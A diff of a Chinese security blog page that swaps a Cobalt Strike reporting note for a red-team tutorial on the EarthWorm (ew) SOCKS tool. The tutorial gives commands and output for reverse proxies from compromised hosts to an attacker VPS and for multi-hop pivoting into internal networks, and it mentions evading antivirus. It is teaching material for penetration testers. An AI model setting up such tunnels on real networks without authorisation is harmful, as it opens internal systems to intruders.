@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【CS学习笔记】4、快速登陆和生成会话报告, Teams Six">
+    <meta name="keywords" content="【内网学习笔记】10、ew 的使用, Teams Six">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【CS学习笔记】4、快速登陆和生成会话报告 | Teams Six</title>
+    <title>【内网学习笔记】10、ew 的使用 | Teams Six</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-12-04-101402.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【CS学习笔记】4、快速登陆和生成会话报告</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】10、ew 的使用</h1>
                 </div>
             </div>
         </div>
@@ -380,16 +380,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
-                            </a>
-                        
                             <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">学习笔记</span>
                             </a>
                         
                             <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                 <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -400,8 +400,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -413,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-19
+                    2021-06-10
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-04
+                    2021-06-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    429
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -449,24 +449,101 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p>
-<ul>
-<li>输出格式为PDF或者Word格式</li>
-<li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li>
-<li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正</li>
-</ul>
-<h1 id="0x01-导出报告类型"><a href="#0x01-导出报告类型" class="headerlink" title="0x01 导出报告类型"></a>0x01 导出报告类型</h1><ul>
-<li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li>
-<li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li>
-<li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li>
-<li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li>
-<li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li>
-<li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a target="_blank" rel="noopener" href="https://attack.mitre.org/">https://attack.mitre.org/</a></li>
-</ul>
+                <h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p>
+<p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p>
+<p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p>
+<p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p>
+<p>开始之前，先理解下正向代理和反向代理的区别。</p>
 <blockquote>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>
+<p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p>
+<p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p>
+</blockquote>
+<h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
+<p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p>
+<blockquote>
+<p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p>
+</blockquote>
+<p>这个描述也是很形象了。</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p>
+<h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p>
+<p>命令也很简单</p>
+<pre><code>ew -s ssocksd -l 1080</code></pre>
+<pre><code> -s 设置状态模式
+ -l 设置监听端口</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 1080
+ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server</code></pre>
+<p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p>
+<h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p>
+<p>在公网 VPS 上执行以下命令：</p>
+<pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre>
+<pre><code> -e 设置反弹主机端口</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444</code></pre>
+<p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p>
+<p>在目标主机上执行以下命令：</p>
+<pre><code>ew -s rssocks -d vps_ip -e 4444</code></pre>
+<pre><code>-d 设置反弹主机 IP</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444</code></pre>
+<p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p>
+<p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p>
+<h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p>
+<p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p>
+<pre><code>内网主机A（有公网IP） --》内网主机B --》内网资源</code></pre>
+<p>在内网主机B上，开启正向连接代理</p>
+<pre><code>ew -s ssocksd -l 4444</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 4444</code></pre>
+<p>在内网主机A上</p>
+<pre><code>ew -s lcx_tran -l 1080 -f hostB_ip -g 4444</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444</code></pre>
+<p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p>
+<h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p>
+<pre><code>VPS --》内网主机A --》内网主机B --》内网资源</code></pre>
+<p>在公网 VPS 上</p>
+<pre><code>ew -s lcx_listen -l 1080 -e 4444</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s lcx_listen -l 1080 -e 4444
+rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444
+init cmd_server_for_rc here
+start listen port here</code></pre>
+<p>表示将 1080 收到的 代理请求转发到 4444 端口上</p>
+<p>在内网主机 B 上</p>
+<pre><code>ew -s ssocksd -l 5555</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 5555</code></pre>
+<p>表示开启 5555 端口的正向代理</p>
+<p>在内网主机 A 上</p>
+<pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555
+lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre>
+<p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p>
+<p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p>
+<h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p>
+<pre><code>VPS --》内网主机 A --》内网主机 B --》内网主机 C</code></pre>
+<p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p>
+<pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444
+rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444
+init cmd_server_for_rc here
+start listen port here</code></pre>
+<p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p>
+<pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre>
+<pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555
+lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre>
+<p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p>
+<pre><code>ew -s lcx_listen -l 5555 -e 6666</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666
+rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666
+init cmd_server_for_rc here
+start listen port here</code></pre>
+<p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p>
+<pre><code>ew -s rssocks -d 192.168.7.110 -e 6666</code></pre>
+<pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666
+rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server</code></pre>
+<p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p>
+<p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p>
+<blockquote>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
@@ -495,7 +572,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/year/200419-150447.html">https://www.teamssix.com/year/200419-150447.html</a>
+                    <a href="https://www.teamssix.com/year/210610-164507.html">https://www.teamssix.com/year/210610-164507.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -533,16 +610,16 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
-                                </a>
-                            
                                 <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
                                 <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                     <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -588,7 +665,7 @@
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2020-04-19T15-04-47',
+        id: '2021-06-10T16-45-07',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -612,46 +689,46 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/200419-150454.html">
+                <a href="/year/210610-164507.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-2.png" class="responsive-img" alt="【CS学习笔记】5、如何建立Payload处理器">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png" class="responsive-img" alt="【内网学习笔记】10、ew 的使用">
                         
-                        <span class="card-title">【CS学习笔记】5、如何建立Payload处理器</span>
+                        <span class="card-title">【内网学习笔记】10、ew 的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。
+                            1、Socks 代理工具介绍Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：
+https://teamssix.com/year/210528-130449.html
+但是 lcx 毕竟年代久远，现在的杀
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
@@ -659,6 +736,10 @@
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -672,30 +753,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/200419-150440.html">
+                <a href="/year/210608-213403.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-12-04-101402.jpg" class="responsive-img" alt="【CS学习笔记】3、如何进行分布操作">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_21-12-06.png" class="responsive-img" alt="【内网学习笔记】9、iodine 使用">
                         
-                        <span class="card-title">【CS学习笔记】3、如何进行分布操作</span>
+                        <span class="card-title">【内网学习笔记】9、iodine 使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这里介绍最基本的团队服务模型，具体由三个服务器构成，具体如下所示。
+                            1、介绍iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 
+iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -705,16 +787,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
-                    
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
